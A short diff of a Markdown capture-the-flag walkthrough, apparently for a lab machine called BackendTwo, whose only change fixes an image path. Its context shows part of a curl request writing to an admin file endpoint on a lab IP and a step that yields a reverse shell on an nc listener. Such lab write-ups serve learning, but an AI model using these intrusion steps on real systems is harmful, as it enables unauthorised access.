@@ -252,7 +252,7 @@ curl -s -X POST http://10.129.227.139/api/v1/admin/file/${b64url} -H "Authorizat
 - execute the function and we get a reverse shell on the `nc` listener
 
 ![[delete function added.png]]
-![[reverse shell.png]]
+![[Medium/Unix/BackendTwo/reverse shell.png]]
 #### Lateral Movement (If any)
 
 #### Privilege Escalation
